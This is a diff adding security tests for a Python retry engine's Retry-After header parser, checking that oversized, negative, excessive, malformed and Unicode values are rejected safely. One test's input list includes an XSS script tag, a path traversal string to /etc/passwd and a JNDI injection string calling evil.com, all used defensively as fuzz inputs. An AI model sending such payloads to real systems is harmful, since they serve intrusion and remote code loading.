@@ -264,6 +264,192 @@ def test_parse_retry_after_invalid_format():
     assert wait is None
 
 
+# ==================== Security Tests ====================
+
+
+def test_parse_retry_after_oversized_header():
+    """Test protection against oversized Retry-After header (DoS attack).
+
+    Validates that headers longer than MAX_HEADER_LENGTH (100 chars)
+    are rejected to prevent potential DoS attacks.
+    """
+    config = RetryConfig()
+    engine = RetryEngine(config)
+
+    # Create a header longer than 100 characters
+    oversized_value = "x" * 150
+
+    response = Mock()
+    response.headers = {'Retry-After': oversized_value}
+
+    wait = engine._parse_retry_after(response)
+    assert wait is None, "Oversized header should be rejected"
+
+
+def test_parse_retry_after_negative_seconds():
+    """Test rejection of negative seconds value."""
+    config = RetryConfig()
+    engine = RetryEngine(config)
+
+    response = Mock()
+    response.headers = {'Retry-After': '-10'}
+
+    wait = engine._parse_retry_after(response)
+    assert wait is None, "Negative seconds should be rejected"
+
+
+def test_parse_retry_after_excessive_seconds():
+    """Test rejection of unreasonably large seconds value.
+
+    Values larger than one year (86400 * 365 seconds) should be rejected
+    to prevent malicious servers from causing extremely long waits.
+    """
+    config = RetryConfig()
+    engine = RetryEngine(config)
+
+    # More than one year
+    excessive_seconds = 86400 * 365 + 1
+
+    response = Mock()
+    response.headers = {'Retry-After': str(excessive_seconds)}
+
+    wait = engine._parse_retry_after(response)
+    assert wait is None, "Excessive seconds value should be rejected"
+
+
+def test_parse_retry_after_malformed_special_chars():
+    """Test handling of special characters and malformed input."""
+    config = RetryConfig()
+    engine = RetryEngine(config)
+
+    malformed_values = [
+        '\x00\x01\x02',  # Null bytes
+        '<script>alert(1)</script>',  # XSS attempt
+        '../../etc/passwd',  # Path traversal attempt
+        'A' * 200,  # Very long string
+        '\n\n\n\n\n',  # Newlines
+        '${jndi:ldap://evil.com}',  # JNDI injection attempt
+        '1e999999',  # Overflow attempt
+        'inf',  # Infinity
+        'nan',  # Not a number
+    ]
+
+    for malformed_value in malformed_values:
+        response = Mock()
+        response.headers = {'Retry-After': malformed_value}
+
+        wait = engine._parse_retry_after(response)
+        # Should either return None or a valid float (not crash)
+        assert wait is None or isinstance(wait, float), \
+            f"Failed to safely handle: {repr(malformed_value)}"
+
+
+def test_parse_retry_after_unicode_chars():
+    """Test handling of Unicode characters in Retry-After."""
+    config = RetryConfig()
+    engine = RetryEngine(config)
+
+    unicode_values = [
+        '60секунд',  # Cyrillic
+        '六十',  # Chinese
+        '🕐🕑🕒',  # Emojis
+        'ℕ𝕦𝕞𝕓𝕖𝕣',  # Math symbols
+    ]
+
+    for unicode_value in unicode_values:
+        response = Mock()
+        response.headers = {'Retry-After': unicode_value}
+
+        wait = engine._parse_retry_after(response)
+        # Should return None (can't parse as valid number or date)
+        assert wait is None, f"Unicode value should be rejected: {unicode_value}"
+
+
+def test_parse_retry_after_malformed_http_date():
+    """Test handling of various malformed HTTP dates."""
+    config = RetryConfig()
+    engine = RetryEngine(config)
+
+    malformed_dates = [
+        'Wed, 99 Xxx 9999 99:99:99 GMT',  # Invalid date components
+        'Not a date at all',
+        '2023-13-45',  # ISO format (not HTTP date format)
+        'Wed, 21 Oct',  # Incomplete
+        'Wed Oct 21 07:28:00 2015',  # Wrong format
+        '21/10/2015 07:28:00',  # Wrong format
+        '',  # Empty string
+        ' ',  # Just whitespace
+    ]
+
+    for malformed_date in malformed_dates:
+        response = Mock()
+        response.headers = {'Retry-After': malformed_date}
+
+        wait = engine._parse_retry_after(response)
+        # Should return None for malformed dates
+        assert wait is None, f"Malformed date should be rejected: {malformed_date}"
+
+
+def test_parse_retry_after_boundary_valid_length():
+    """Test that valid headers at boundary length (100 chars) work."""
+    config = RetryConfig()
+    engine = RetryEngine(config)
+
+    # Exactly 100 characters - should be accepted
+    boundary_value = "60" + " " * 98  # 60 + 98 spaces = 100 chars
+
+    response = Mock()
+    response.headers = {'Retry-After': boundary_value}
+
+    # Should parse successfully as 60 (leading number, spaces ignored)
+    wait = engine._parse_retry_after(response)
+    assert wait == 60.0, "Valid boundary-length header should be accepted"
+
+
+def test_parse_retry_after_edge_case_zero():
+    """Test handling of zero seconds."""
+    config = RetryConfig()
+    engine = RetryEngine(config)
+
+    response = Mock()
+    response.headers = {'Retry-After': '0'}
+
+    wait = engine._parse_retry_after(response)
+    assert wait == 0.0, "Zero should be valid"
+
+
+def test_parse_retry_after_edge_case_float():
+    """Test handling of float values."""
+    config = RetryConfig()
+    engine = RetryEngine(config)
+
+    response = Mock()
+    response.headers = {'Retry-After': '123.456'}
+
+    wait = engine._parse_retry_after(response)
+    assert wait == 123.456, "Float values should be accepted"
+
+
+def test_parse_retry_after_scientific_notation():
+    """Test handling of scientific notation."""
+    config = RetryConfig()
+    engine = RetryEngine(config)
+
+    # Valid scientific notation within reasonable range
+    response = Mock()
+    response.headers = {'Retry-After': '1.5e2'}  # 150
+
+    wait = engine._parse_retry_after(response)
+    assert wait == 150.0, "Valid scientific notation should work"
+
+    # Invalid scientific notation (too large)
+    response2 = Mock()
+    response2.headers = {'Retry-After': '1e10'}  # 10 billion seconds
+
+    wait2 = engine._parse_retry_after(response2)
+    assert wait2 is None, "Excessive scientific notation should be rejected"
+
+
 # ==================== Async Tests ====================
 
 @pytest.mark.asyncio
